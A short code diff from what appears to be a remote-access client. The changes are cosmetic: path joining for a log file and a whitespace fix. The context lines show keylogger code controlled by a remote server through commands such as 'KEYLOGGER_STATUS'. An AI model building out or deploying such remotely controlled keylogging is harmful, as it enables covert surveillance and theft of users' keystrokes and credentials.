@@ -23,9 +23,9 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
 if platform.system() == 'Windows':
     import ctypes
-    LOG = sys.path[0] + '\\log.log'
+    LOG = os.path.join(sys.path[0], 'log.log')
 else:
-    LOG = sys.path[0] + '/log.log'
+    LOG = os.path.join(sys.path[0], 'log.log')
 
 try:
     from pynput.keyboard import Listener
@@ -445,7 +445,7 @@ class Client(object):
                     logging.info('Started Keylogger')
                 self.send(json_dumps([True]))
                 continue
-            
+
             if data[0] == 'KEYLOGGER_STATUS':
                 if not _pynput or not KeyListener.running:
                     self.send(json_dumps([False]))
